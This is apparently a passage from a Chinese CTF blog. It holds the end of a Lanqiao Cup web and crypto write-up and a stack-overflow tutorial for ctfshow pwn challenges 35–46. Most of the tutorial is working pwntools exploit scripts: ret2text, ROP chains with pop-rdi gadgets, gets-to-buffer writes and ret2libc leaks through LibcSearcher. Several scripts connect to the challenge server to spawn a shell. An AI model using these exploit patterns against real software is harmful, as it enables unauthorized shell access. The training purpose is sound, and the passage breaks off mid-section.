class="string">&#x27;logs.html&#x27;</span>, log_content=log_content)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;secret.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>():</span><br><span class="line">    file_name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> file_name:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;no_file_name.html&#x27;</span>)</span><br><span class="line">    full_path = os.path.abspath(os.path.join(SAFE_ROOT_DIR, file_name))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> full_path.startswith(SAFE_ROOT_DIR) <span class="keyword">or</span> <span class="string">&#x27;config&#x27;</span> <span class="keyword">in</span> full_path:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;no_premission.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(full_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            content = f.read()</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;file_content.html&#x27;</span>, content=content)</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;file_not_found.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>5.secret_key9360<img src="/2025/04/26/%E8%93%9D%E6%A1%A5%E6%9D%AF%E9%83%A8%E5%88%86wp/wps8.jpg" alt="img"></p>
<p>解题思路:我们拿到了一长串加密后的d9d1c4d9e0da98a2c9dd6e6c6f5dd7c8c5d392a8c0a09aa672986668a09ac4a7caab90a0c9df70679cad</p>
<p>我们还拿到了加密的密钥secret_key9360</p>
<p>原文当中的加密函数为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 模拟敏感信息</span></span><br><span class="line">sensitive_info = SENSITIVE_INFO</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密密钥</span></span><br><span class="line">encryption_key = ENCRYPTION_KEY</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simple_encrypt</span>(<span class="params">text, key</span>):</span><br><span class="line">    encrypted = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):</span><br><span class="line">        char = text[i]</span><br><span class="line">        key_char = key[i % <span class="built_in">len</span>(key)]</span><br><span class="line">        encrypted.append(<span class="built_in">ord</span>(char) + <span class="built_in">ord</span>(key_char))</span><br><span class="line">    <span class="keyword">return</span> encrypted.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">encrypted_sensitive_info = simple_encrypt(sensitive_info, encryption_key)</span><br></pre></td></tr></table></figure>
<p>通过这三部分,应该可以通过python解出来.</p>
<p>但是这里吃了编程的亏</p>
<p>距离flag就差最后的解密了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">推理一下这个加密的思路:</span><br><span class="line">他将一个sensitive_info进行加密,密钥为encryption_key.</span><br><span class="line">将sensitive_info的长度作为i的范围,将encryption_key的第i % len(key)作为key_char,最终将i个字符的sensitive_info和经过模运算的key_char的Unicode拼接起来最为最终的结果encrypted_sensitive_info</span><br></pre></td></tr></table></figure>
<p>那怎么逆过来算出来呢?</p>
<p>下面是加密的注释和解密思路</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 模拟敏感信息</span></span><br><span class="line">sensitive_info = SENSITIVE_INFO</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密密钥</span></span><br><span class="line">encryption_key = ENCRYPTION_KEY</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simple_encrypt</span>(<span class="params">text, key</span>):</span><br><span class="line">    encrypted = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):</span><br><span class="line">        char = text[i]</span><br><span class="line">        key_char = key[i % <span class="built_in">len</span>(key)]</span><br><span class="line">        encrypted.append(<span class="built_in">ord</span>(char) + <span class="built_in">ord</span>(key_char))</span><br><span class="line">        <span class="comment">#密文 = ord(明文[i]) + ord(i % 密钥)</span></span><br><span class="line">   	 <span class="comment">#那么明文 = 密文 - ord(i % 密钥)</span></span><br><span class="line">    <span class="keyword">return</span> encrypted.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">encrypted_sensitive_info = simple_encrypt(sensitive_info, encryption_key)</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">uncode</span>(<span class="params">hextext,key</span>):</span><br><span class="line">    encrypted = <span class="built_in">bytearray</span>.fromhex(hextext)</span><br><span class="line">    decrypted = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted)):</span><br><span class="line">        key_char = key[i % <span class="built_in">len</span>(key)]</span><br><span class="line">        decrypted_char = <span class="built_in">chr</span>(encrypted[i] - <span class="built_in">ord</span>(key_char))</span><br><span class="line">        decrypted += decrypted_char</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line">encrypted_sensitive_info = <span class="string">&quot;d9d1c4d9e0da98a2c9dd6e6c6f5dd7c8c5d392a8c0a09aa672986668a09ac4a7caab90a0c9df70679cad&quot;</span></span><br><span class="line">encryption_key = <span class="string">&quot;secret_key9360&quot;</span></span><br><span class="line">recovered_sensitive_info = uncode(encrypted_sensitive_info, encryption_key)</span><br><span class="line"><span class="built_in">print</span>(recovered_sensitive_info)</span><br></pre></td></tr></table></figure>
<p>flag{f97dd599-dcba-4a55-9e08-5a5e715df74f}</p>
]]></content>
      <tags>
        <tag>蓝桥杯</tag>
      </tags>
  </entry>
  <entry>
    <title>栈溢出</title>
    <url>/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<p>请先阅读王爽的汇编语言</p>
<h1>pwn35</h1>
<p><img src="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250420174236854-17454985513721-174565732452810-17463866020241.png" alt="image-20250420174236854"></p>
<h1>pwn36</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">存在后门函数，如何利用？</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250423204501800-17454985513732-174565732452912-17463866020252.png" alt="image-20250423204501800"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载本地 ELF 文件</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn36&#x27;</span>)</span><br><span class="line">context.binary = elf</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;  # 可选，调试信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动本地进程</span></span><br><span class="line"><span class="comment">#p = process(elf.path)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程打</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28171</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 payload：0x28+4 = 40 字节，覆盖 ret</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x28</span> + <span class="number">4</span>) + p32(<span class="number">0x08048586</span>)  <span class="comment"># 后门函数地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 payload</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拿 shell 或交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1>pwn37</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32位的 system(“/bin/sh”) 后门函数给你</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250423204557226-17454985513733-174565732452811-17463866020253.png" alt="image-20250423204557226"></p>
<p><img src="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250420184649786-17454985513734-17463866020254.png" alt="image-20250420184649786"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn36&#x27;)</span><br><span class="line">context.binary = elf</span><br><span class="line">p = process(elf.path)</span><br><span class="line"></span><br><span class="line">offset = 14+4</span><br><span class="line">backdoor = 0x08048521</span><br><span class="line">payload = b&#x27;a&#x27; * offset + p32(backdoor)</span><br></pre></td></tr></table></figure>
<h1>pwn38</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">64位的 system(“/bin/sh”) 后门函数给你</span><br></pre></td></tr></table></figure>
<p>这里是64位的,除了38的步骤换位p64之外还需要栈平衡,也就是说加一个ret在padding后面.极其简单地概括栈平衡:我们的p64或者p32的个数必须是偶数个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn38&#x27;)</span><br><span class="line">context.binary = elf</span><br><span class="line"># p = process(elf.path)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28248)</span><br><span class="line">offset = 10+8</span><br><span class="line">backdoor = 0x0400657</span><br><span class="line">ret = 0x0400772</span><br><span class="line"></span><br><span class="line">payload = offset * b&#x27;a&#x27; + p64(ret) + p64(backdoor)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1>pwn39</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32位的 system(); &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn39&#x27;)</span><br><span class="line">context.binary = elf</span><br><span class="line"># p = process(elf.path)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28279)</span><br><span class="line"></span><br><span class="line">padding = 18 + 4</span><br><span class="line">system_add = elf.sym[&#x27;system&#x27;]</span><br><span class="line">ret_add = 0x08048356 #0x08048356 : ret</span><br><span class="line">bin_sh_str = 0x08048750</span><br><span class="line"></span><br><span class="line">payload = padding * b&#x27;a&#x27; + p32(system_add) + p32(ret_add) + p32(bin_sh_str)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>这里存在了一个问题,我之前一直是看的buf[]数组的大小,这里是buf[14].这里直接使用数组的大小进行padding是不可以的.我们用另外几种办法,</p>
<p>1.到达ebp的距离为12h</p>
<p><img src="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250423203914429-17454985513736-174565732452913-17463866020255.png" alt="image-20250423203914429"></p>
<p>2.gdb看到要padding18个</p>
<p><img src="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250423203954173-17454985513735-174565732452914-17463866020258.png" alt="image-20250423203954173"></p>
<p>3.gdb运行直接输入过多数据看到最终结果</p>
<p><img src="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250423204158387-17454985513737-174565732452916-17463866020257.png" alt="image-20250423204158387"></p>
<h1>pwn40</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objdump -d -j .plt pwn40</span><br><span class="line"></span><br><span class="line">0000000000400520 &lt;system@plt&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn40 --only &quot;pop|ret&quot;</span><br><span class="line"></span><br><span class="line">0x00000000004007e3 : pop rdi ; ret</span><br></pre></td></tr></table></figure>
<p><strong>对于64位的参数,当参数小于6个时,参数从左到右依次放入寄存器：rdi、rsi、rdx、rcx、r8、r9.从第七个开始放到栈中.</strong></p>
<p>对于这道题我们需要用到pop汇编指令将bin_sh的str作为system的参数,进行下一条指令的执行.所以这里<strong>并不是把bin_sh的参数放在system的前面</strong>,<strong>而是将system的参数pop到rdi当中.</strong></p>
<p>我们要执行system(/bin/sh)那么我们就要事先将/bin/sh弄到rdi寄存器当中,当执行system时,他会执行rdi当中的东西</p>
<p>那么对于两个参数呢?那么我们就需要pop_rsi了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn40&#x27;)</span><br><span class="line">context.binary = elf</span><br><span class="line">#p = process(elf.path)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28129)</span><br><span class="line">offset = 0xa + 8</span><br><span class="line">sys_addr = elf.sym[&#x27;system&#x27;]</span><br><span class="line">ret_addr = 0x4004fe</span><br><span class="line">bin_sh_srt = 0x0400808</span><br><span class="line">pop_rdi_addr = 0x04007e3</span><br><span class="line"></span><br><span class="line">payload = offset * b&#x27;a&#x27; + p64(pop_rdi_addr) + p64(bin_sh_srt) +p64(ret_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1>pwn41</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32位的 system(); 但是没&quot;/bin/sh&quot; ，好像有其他的可以替代</span><br></pre></td></tr></table></figure>
<p>没有/bin/sh,但是有一个sh,sh也是shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn41&#x27;)</span><br><span class="line">context.binary = elf</span><br><span class="line">p = process(elf.path)</span><br><span class="line"></span><br><span class="line">padding = 0x12 + 4</span><br><span class="line">sys_addr = elf.sym[&#x27;system&#x27;]</span><br><span class="line">sh_addr = 0x080487BA</span><br><span class="line"></span><br><span class="line">payload = padding * b&#x27;a&#x27; + p32(sys_addr) +p32(0) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1>pwn42</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">64位的 system(); 但是没&quot;/bin/sh&quot; ，好像有其他的可以替代</span><br></pre></td></tr></table></figure>
<p>最后有一个栈平衡知识点的运用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn42&#x27;)</span><br><span class="line">p = process(elf.path)</span><br><span class="line">context.binary = elf</span><br><span class="line"></span><br><span class="line">padding = 0xA + 8</span><br><span class="line">ret_pop_rdi = 0x0400843 #0x0000000000400843 : pop rdi ; ret</span><br><span class="line">ret = 0x040053e #0x000000000040053e : ret</span><br><span class="line">sh_addr = 0x0400872</span><br><span class="line">sys_addr = elf.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">payload = padding * b&#x27;a&#x27; + p64(ret_pop_rdi) + p64(sh_addr) + p64(ret) + p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1>pwn43</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32位的 system(); 但是好像没&quot;/bin/sh&quot; 上面的办法不行了，想想办法</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb ./pwn43</span><br><span class="line">b main</span><br><span class="line">r</span><br><span class="line">vmmap</span><br></pre></td></tr></table></figure>
<p>看到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x804b000  0x804c000 rw-p     1000 2000   /home/ctfshow/桌面/pwn/pwn43</span><br></pre></td></tr></table></figure>
<p>也就是从0x804b000开始到0x804c000结束,都可以进行写入操作,既然题目没有给出/bin/sh字样,那么我们可以直接写入/bin/sh,其实直接写sh也可以.</p>
<p>那么这段区域当中有什么地方可以写呢?在ida当中可以看到一个buf2,我们可以在这里面写入sh</p>
<p><img src="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250424203914646-174565732452915-17463866020256.png" alt="image-20250424203914646"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn43&#x27;)</span><br><span class="line">context.binary = elf</span><br><span class="line">p = process(elf.path)</span><br><span class="line"></span><br><span class="line">padding = 112</span><br><span class="line">gets_plt = elf.sym[&#x27;gets&#x27;]</span><br><span class="line">sys_plt = elf.sym[&#x27;system&#x27;]</span><br><span class="line">buf2_addr = 0x0804B060</span><br><span class="line">payload = padding * b&#x27;a&#x27; + p32(gets_plt) + p32(sys_plt) + p32(buf2_addr) + p32(buf2_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&quot;sh&quot;)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1>pwn44</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">64位的 system(); 但是好像没&quot;/bin/sh&quot; 上面的办法不行了，想想办法</span><br></pre></td></tr></table></figure>
<p>换成了64位,关键就是寄存器了<br>
我们需要使用寄存器和gets函数来完成写入sh操作,剩下的就和pwn43差不多了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn44&#x27;)</span><br><span class="line">context.binary = elf</span><br><span class="line">p = process(elf.path)</span><br><span class="line"></span><br><span class="line">padding = 0xa + 8</span><br><span class="line">ret_addr = 0x04004fe    #0x00000000004004fe : ret</span><br><span class="line">poprdi_ret_addr = 0x04007f3     #0x00000000004007f3 : pop rdi ; ret</span><br><span class="line">gets_addr = elf.sym[&#x27;gets&#x27;]</span><br><span class="line">sys_addr = elf.sym[&#x27;system&#x27;]</span><br><span class="line">buf2_addr = 0x0602080</span><br><span class="line"></span><br><span class="line">payload = padding * b&#x27;a&#x27; + p64(poprdi_ret_addr) + p64(buf2_addr) + p64(gets_addr) + p64(poprdi_ret_addr) + p64(buf2_addr) +p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&quot;sh&quot;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1>pwn45	Return-to-libc</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32位 无 system 无 &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure>
<p>题目没有给sys和sh,可以通过libc地址泄露拿shell<br>
为什么使用ret2libc?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.NX保护打开</span><br><span class="line">2.部分RELRO保护</span><br><span class="line">3.未开启ASLR</span><br></pre></td></tr></table></figure>
<p>需要泄露libc地址,从而计算出其他函数的地址,进而拿到sys和sh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssize_t write(int fd,const void*buf,size_t count);</span><br><span class="line">fd:是文件描述符 	buf:通常是一个字符串，需要写入的字符串	count：是每次写入的字节数</span><br><span class="line">通常我们想要把内容输出到终端（stdout），这时候：fd应该为1</span><br><span class="line"></span><br><span class="line">fd=0 ：给程序输入</span><br><span class="line"></span><br><span class="line">fd=1 ：往屏幕输出</span><br><span class="line"></span><br><span class="line">fd=2 ：往错误输出（比如报错信息）</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小端序是从后往前读</span><br><span class="line">0x10 0x6f 0xdc 0xf7   ← 小端序</span><br><span class="line">0xf7dc6f10</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250426173951014-17463866020259.png" alt="image-20250426173951014"></p>
<p>内存高地址<br>
┌───────────────────────────────────────────┐<br>
│ stack (栈)                               															 		 │<br>
│                                           																	  	 │<br>
├───────────────────────────────────────────┤<br>
│ heap (堆)                               																	  │<br>
│                                           																		   │<br>
├───────────────────────────────────────────┤<br>
│ <a href="http://libc.so">libc.so</a> (动态库, 地址随机)              													       │<br>
│ ±-------------------+                    																	│<br>
│ | write() @ 0xf7cc6f10 |  &lt;-- offset不变  											  │<br>
│ | system()             		 |                  														 │<br>
│ | “/bin/sh” 字符串  	   |                  														 │<br>
│ ±-------------------+                    																	│<br>
├───────────────────────────────────────────┤<br>
│ ELF程序 (代码段.text, 数据段.data等)       												│<br>
│ ±-----------------+                      																	│<br>
│ | PLT表: write@plt  | --&gt; jmp *write@got   										 │<br>
│ | PLT表: system@plt | --&gt; jmp *system@got   									│<br>
│ ±-----------------+                      																	│<br>
│ | GOT表: write@got  | 存着 libc中write地址  										|<br>
│ | GOT表: system@got | 存着 libc中system地址 							  	|<br>
│ ±-----------------+                      																	│<br>
├───────────────────────────────────────────┤<br>
│ 其他库或程序段                            															  │<br>
└───────────────────────────────────────────┘<br>
内存低地址</p>
<p>注意我们泄露的是write的libc地址.那么你是否会有一个问题?<br>
libc_base = write - libc.dump(‘write’)那我们泄露的是write的libc地址,那么libc_base 不应该为零吗?<br>
答:前面的图中说了,libc库在内存上,所以我们计算出的libc_base就是libc库段的开头</p>
<p>那么我们有了接地址libc_base,那么只要libc.dump(‘函数’)拿到相应函数的<strong>偏移地址</strong>即可调用相应函数</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn45&#x27;</span>)</span><br><span class="line">context.binary = elf</span><br><span class="line">p = process(elf.path)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一阶段：泄露wirte的libc地址</span></span><br><span class="line">padding = <span class="number">0x6B</span> + <span class="number">4</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload = cyclic(padding) + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;O.o?&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">leak = p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)</span><br><span class="line">write = u32(leak[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write), <span class="built_in">repr</span>(leak))   <span class="comment">#0xf7dc6f10 b&#x27;\n\x10o\xdc\xf7&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#第二阶段,计算libc_base并搞出system和str_bin_sh</span></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write)</span><br><span class="line">libc_base = write - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys_addr_libc = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr_libc = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * padding</span><br><span class="line">payload2 += p32(sys_addr_libc)</span><br><span class="line">payload2 += p32(<span class="number">0xdeadbeef</span>)              <span class="comment"># fake return address</span></span><br><span class="line">payload2 += p32(bin_sh_addr_libc)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;O.o?&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#2 - libc6_2.27-3ubuntu1.5_i386</span></span><br></pre></td></tr></table></figure>
<h1>pwn46</h1>
<table>
<thead>
<tr>
<th>架构</th>
<th>地址宽度</th>
<th>通常怎么处理泄露的字节？</th>
</tr>
</thead>
<tbody>
<tr>
<td>32位程序</td>
<td>地址是4字节（32bit）</td>
<td>recv直到<code>\xf7</code>（因为32位libc一般是0xf7开头），取4字节</td>
</tr>
<tr>
<td>64位程序</td>
<td>地址是6字节有效（64bit，但是高16bit通常是0x0000）</td>
<td>recv直到<code>\x7f</code>（因为64位libc一般是0x7f开头），取6字节，补两字节<code>\x00</code></td>
</tr>
</tbody>
</table>
<p>在<strong>64位程序</strong>（x86_64）中：</p>
<ul>
<li>
<p>地址是<strong>8字节</strong>（理论上）</p>
</li>
<li>
<p>但是现实中，<strong>高16位（最高两个字节）一般是0x0000</strong>（因为用户空间只有低48位有效）</p>
</li>
<li>
<p>所以泄露时：</p>
<ul>
<li>
<p>收数据直到<code>\x7f</code></p>
<ul>
<li>因为64位libc地址通常是 <code>0x00007f...</code> 这样，<code>0x7f</code>是末尾</li>
</ul>
</li>
<li>
<p>[-6:]取最近的6字节</p>
<ul>
<li>因为有效负载其实只有6字节</li>
</ul>
</li>
<li>
<p><code>.ljust(8, b'\x00')</code></p>
<ul>
<li>
<p>补齐到8字节（在低地址填两个<code>\x00</code>）</p>
</li>
<li>
<p>变成真正的64位小端序地址</p>
<p>比如泄露出的6字节是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">68 56 34 12 7f 00</span><br></pre></td></tr></table></figure>
<p>补齐后（小端序）是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">68 56 34 12 7f 00 00 00</span><br></pre></td></tr></table></figure>
<p>然后用<code>u64()</code>解析成整数，就是正确的64位地址。</p>
<p>比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">leak = p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;)</span><br><span class="line">addr = u64(leak)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>puts</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn46&#x27;)</span><br><span class="line">context.binary = elf</span><br><span class="line"># p = process(elf.path)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28217)</span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[&#x27;main&#x27;]</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]#泄露puts</span><br><span class="line"># puts_got = elf.got[&#x27;read&#x27;]#泄露read</span><br><span class="line">ret_rdi = 0x0400803               #0x0000000000400803 : pop rdi ; ret</span><br><span class="line">ret = 0x04004fe                   #0x00000000004004fe : ret</span><br><span class="line">padding = 0x70 + 8</span><br><span class="line">payload = cyclic(padding) + p64(ret_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">p.recvuntil(&quot;O.o?&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">leak = p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;)</span><br><span class="line">puts = u64(leak)</span><br><span class="line">print(hex(puts))</span><br><span class="line"></span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">libc = LibcSearcher(&#x27;puts&#x27;,puts)</span><br><span class="line">libc_base = puts - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">sys = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">payload1 = cyclic(padding) + p64(ret_rdi) +p64(bin) + p64(ret) + p64(sys)</span><br><span class="line">p.sendlineafter(&quot;O.o?&quot;,payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>write</p>
